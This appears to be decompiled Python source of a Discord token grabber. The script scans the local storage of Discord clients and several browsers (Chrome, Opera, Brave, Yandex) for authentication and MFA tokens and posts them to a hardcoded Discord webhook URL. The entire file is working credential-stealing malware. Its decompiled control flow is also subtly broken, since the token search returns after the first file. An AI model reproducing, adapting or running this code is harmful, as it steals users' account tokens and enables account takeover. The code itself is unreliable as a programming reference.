# Python bytecode 3.8 (3413)
import os, re, json
from urllib.request import Request, urlopen
WEBHOOK_URL = 'https://discord.com/api/webhooks/776617075426852914/ZTxuZIN2dCGFOIfcApDQuvAbdfBHgSkEBRXceXCGzq1feq8MgJfy06dernVokzaId9PG'
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
            pass
        else:
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
                for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)

                else:
                    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'Discord':roaming + '\\Discord', 
     'Discord Canary':roaming + '\\discordcanary', 
     'Discord PTB':roaming + '\\discordptb', 
     'Google Chrome':local + '\\Google\\Chrome\\User Data\\Default', 
     'Opera':roaming + '\\Opera Software\\Opera Stable', 
     'Brave':local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 
     'Yandex':local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            pass
        else:
            message += f"\n**{platform}**\n```\n"
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f"{token}\n"

            else:
                message += 'No tokens found.\n'
            message += '```'
    else:
        headers = {'Content-Type':'application/json', 
         'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        payload = json.dumps({'content': message})
        try:
            req = Request(WEBHOOK_URL, data=(payload.encode()), headers=headers)
            urlopen(req)
        except:
            pass


if __name__ == '__main__':
    main()